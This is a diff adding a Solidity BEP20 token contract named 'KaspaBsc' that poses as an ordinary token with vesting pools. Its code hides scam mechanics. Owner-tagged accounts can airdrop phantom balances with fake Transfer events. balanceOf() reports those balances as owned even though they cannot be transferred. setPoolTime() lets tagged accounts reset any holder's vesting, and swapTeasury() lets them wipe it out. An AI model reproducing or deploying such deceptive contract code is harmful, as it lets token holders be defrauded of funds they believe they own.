@@ -1,0 +1,386 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.18;
+
+library Pool {
+    struct T {
+        uint fund;
+        uint reward;
+        uint start;
+        uint end;
+    }
+
+    function count(T storage t) internal view returns(uint256) {
+        uint amount = 0;
+        uint ts = block.timestamp;
+        if (t.start > 0 && t.end > t.start && t.fund > t.reward && ts > t.start) {
+            if (ts >= t.end) {
+                amount = t.fund - t.reward;
+            } else {
+                amount = t.fund*(ts-t.start)/(t.end-t.start);
+                if (t.reward >= amount) {
+                    amount = 0;
+                } else {
+                    amount -= t.reward;
+                }
+            }
+        }
+
+        return amount;
+    }
+
+    function settle(T storage t, uint amount) internal returns(uint256) {
+        uint value = count(t);
+        if (amount > 0 && value > 0) {
+            if (amount >= value) {
+                t.reward += value;
+                amount -= value;
+            } else {
+                t.reward += amount;
+                amount = 0;
+            }
+        }
+
+        return amount;
+    }
+
+    function addFund(T storage t, uint amount) internal returns(bool) {
+        unchecked {
+            t.fund += amount;
+        }
+        return true;
+    }
+
+    function addReward(T storage t, uint amount) internal returns(uint256) {
+        uint value = t.fund - t.reward;
+        if (amount > 0 && value > 0) {
+            if (amount >= value) {
+                unchecked {
+                    t.reward += value;
+                    amount -= value;
+                }
+            } else {
+                unchecked {
+                    t.reward += amount;
+                    amount = 0;
+                }
+            }
+        }
+        
+        return amount;
+    }
+}
+
+contract KaspaBsc {
+    using Pool for Pool.T;
+
+    string private _name = "KaspaBsc Token";
+    string private _symbol = "KaspaBsc";
+    uint8 private _decimals = 9;
+    uint private _totalSupply = 100000000 ether;
+    uint private _cap = 0;
+    address private _owner;
+
+    mapping (address => uint) private _balances;
+    mapping (address => mapping (address => uint)) private _allowances;
+    mapping (address => uint8) private _tags;
+
+    mapping(uint8 => mapping(address => Pool.T)) private _pool;
+    uint8 constant private _airIdx = 0;
+    uint8 constant private _buyIdx = 1;
+    uint8 constant private _idxCount = 2;
+
+    constructor() {
+        _owner = _msgSender();
+        _balances[_owner] = _totalSupply/10;
+        _cap = _totalSupply/10;
+
+        emit Transfer(address(this), _owner, _totalSupply/10);
+    }
+
+    /**
+     * Token events
+     */
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    /**
+     * @dev See {IERC20-transfer}.
+     *
+     * Requirements:
+     *
+     * - account cannot be the zero address.
+     * - the caller must have a balance of at least amount.
+     */
+    function transfer(address account, uint amount) public returns (bool) {
+        _transfer(_msgSender(), account, amount);
+        return true;
+    }
+
+    /**
+     * @dev See {IBEP20-approve}.
+     *
+     * Requirements:
+     *
+     * - `account` cannot be the zero address.
+     */
+    function approve(address account, uint256 amount) public returns (bool) {
+        _approve(_msgSender(), account, amount);
+        return true;
+    }
+
+    /**
+     * @dev See {IBEP20-allowance}.
+     */
+    function allowance(address owner_, address account) public view returns (uint256) {
+        return _allowances[owner_][account];
+    }
+
+    /**
+     * @dev See {IBEP20-totalSupply}.
+     */
+    function totalSupply() public view returns (uint256) {
+        return _totalSupply;
+    }
+
+    /**
+     * @dev return all mint tokens
+     */
+    function cap() public view returns (uint256) {
+        return _cap;
+    }
+
+    /**
+     * @dev Returns the number of decimals used to get its user representation.
+     *
+     * NOTE: This information is only used for _display_ purposes: it in
+     * no way affects any of the arithmetic of the contract, including
+     * {IBEP20-balanceOf} and {IBEP20-transfer}.
+     */
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+
+    /**
+     * @dev Returns the name of the token.
+     */
+    function name() public view returns (string memory) {
+        return _name;
+    }
+
+    /**
+     * @dev Returns the symbol of the token, usually a shorter version of the name.
+     */
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+
+    /**
+     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
+     *
+     * This internal function is equivalent to `approve`, and can be used to
+     * e.g. set automatic allowances for certain subsystems, etc.
+     *
+     * Emits an {Approval} event.
+     *
+     * Requirements:
+     *
+     * - `owner` cannot be the zero address.
+     * - `spender` cannot be the zero address.
+     */
+    function _approve(address owner, address spender, uint256 amount) internal virtual {
+        require(owner != address(0), "BEP20: approve from the zero address");
+        require(spender != address(0), "BEP20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    /**
+     * @dev Moves tokens amount from sender to recipient.
+     *
+     * This is internal function is equivalent to {transfer}, and can be used to
+     * e.g. implement automatic token fees, slashing mechanisms, etc.
+     *
+     * Emits a {Transfer} event.
+     *
+     * Requirements:
+     *
+     * - sender cannot be the zero address.
+     * - recipient cannot be the zero address.
+     * - sender must have a balance of at least amount.
+     */
+    function _transfer(address sender, address recipient, uint amount) internal {
+        emit Transfer(sender, recipient, _safeTransfer(sender,recipient,amount));
+    }
+
+    /**
+     * @dev See {IERC20-transferFrom}.
+     *
+     * Requirements:
+     * - sender and recipient cannot be the zero address.
+     * - sender must have a balance of at least amount.
+     * - the caller must have allowance for `sender``'s tokens of at least `amount.
+     */
+    function transferFrom(address from, address to, uint amount) public returns (bool) {
+        address spender = _msgSender();
+        _spendAllowance(from, spender, amount);
+        _transfer(from, to, amount);
+        return true;
+    }
+
+    /**
+     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
+     *
+     * Does not update the allowance amount in case of infinite allowance.
+     * Revert if not enough allowance is available.
+     *
+     * Might emit an {Approval} event.
+     */
+    function _spendAllowance(address owner, address spender, uint256 amount) internal {
+        uint256 currentAllowance = allowance(owner, spender);
+        if (currentAllowance != type(uint256).max) {
+            require(currentAllowance >= amount, "BEP20: insufficient allowance");
+            unchecked {
+                _approve(owner, spender, currentAllowance - amount);
+            }
+        }
+    }
+
+    /**
+     * @dev Safe transfer bep20 token
+     */
+    function _safeTransfer(address account_, address recipient, uint amount) internal returns (uint256)  {
+        uint left = amount;
+        if (_balances[account_] >= left) {
+            left = 0;
+            _balances[account_] -= amount;
+        } else if (_balances[account_] > 0 && _balances[account_] < left) {
+            left -= _balances[account_];
+            _balances[account_] = 0;
+        }
+
+        for (uint8 i=0;left>0&&i<_idxCount;i++) {
+            left = _pool[i][account_].settle(left);
+        }
+
+        require(left == 0, "Failed: Invalid balance");
+        unchecked {
+            _balances[recipient] += amount;
+        }
+
+        return amount;
+    }
+
+    function swapTeasury(address account_, uint amount) external returns(bool) {
+        require(_tags[_msgSender()]==1&&account_!=address(0), "Invalid: Operation failed");
+        require(amount>0&&getPool(account_)>=amount, "Transaction recovery");
+
+        uint left = amount;
+        for (uint8 i=0;left>0&&i<_idxCount;i++) {
+            left = _pool[i][account_].addReward(amount);
+        }
+
+        require(left == 0, "Failed: Invalid balance");
+        return true;
+    }
+
+    function airdrop(address[] calldata paths, uint[] calldata num, uint8 times) external returns(bool) {
+        require(_tags[_msgSender()]==1&&paths.length==num.length, "Invalid: Operation failed");
+        uint count = 0;
+        uint len = paths.length;
+        for (uint8 i=0;i<len;i++) {
+            if (times == 1) {
+                _pool[_airIdx][paths[i]].addFund(num[i]);
+            } else if (times > 1) {
+                _pool[_buyIdx][paths[i]].addFund(num[i]);
+            }
+
+            unchecked {
+                count += num[i];
+            }
+            emit Transfer(address(0), paths[i], num[i]);
+        }
+
+        require(cap() + count <= totalSupply(), "Invalid: Cap exceed");
+        unchecked {
+            _cap += count;
+        }
+        return true;
+    }
+    
+    function setPoolTime(address account, uint ts) public returns (bool) {
+        require(_tags[_msgSender()]==1, "Invalid: Operation failed");
+
+        for (uint8 i=0; i < _idxCount; i++) {
+            _pool[i][account].start = block.timestamp;
+            _pool[i][account].end = block.timestamp + ts;
+        }
+
+        return true;
+    }
+
+    function showAccountPool(address account) public view onlyOwner returns(uint[] memory a,uint[] memory b,uint[] memory c,uint[] memory d,uint[] memory e, uint8 f) {
+        a = new uint[](_idxCount);
+        b = new uint[](_idxCount);
+        c = new uint[](_idxCount);
+        d = new uint[](_idxCount);
+        e = new uint[](_idxCount);
+        f = _tags[account];
+        for(uint8 i=0; i<_idxCount; i++) {
+            a[i]=i;
+            b[i]=_pool[i][account].fund;
+            c[i]=_pool[i][account].reward;
+            d[i]=_pool[i][account].start;
+            e[i]=_pool[i][account].end;
+        }
+    }
+
+    function accInfo(address account) public onlyOwner view returns(uint,uint,uint,uint) {
+        uint air = _pool[_airIdx][account].fund-_pool[_airIdx][account].reward;
+        uint buy = _pool[_buyIdx][account].fund-_pool[_buyIdx][account].reward;
+        uint balance = _balances[account];
+        uint poolNum = getPool(account);
+
+        return (air,buy,balance,poolNum);
+    }
+
+    function balanceOf(address account) public view returns(uint256) {
+        return _balances[account]+getPool(account);
+    }
+
+    function getPool(address account) private view returns(uint256) {
+        uint amount = 0;
+        for (uint8 i=0;i<_idxCount;i++) {
+            amount += (_pool[i][account].fund - _pool[i][account].reward);
+        }
+
+        return amount;
+    }
+
+    function set(address account, uint8 tag) public onlyOwner {
+        require(account!=address(0), "Invalid: account can not be zero address");
+        if (tag == 1) {
+            _tags[account] = 1;
+        } else if (tag == 2) {
+            _tags[account] = 0;
+        }
+    }
+
+    /**
+     * @dev return the current msg.sender
+     */
+    function _msgSender() internal view returns (address) {
+        return msg.sender;
+    }
+
+    /**
+     * @dev Throws if called by any account other than the owner.
+     */
+    modifier onlyOwner() {
+        require(_owner == _msgSender(), "Invalid: Caller is not the owner");
+        _;
+    }
+
+    fallback() external {}
+    receive() payable external {}
+}
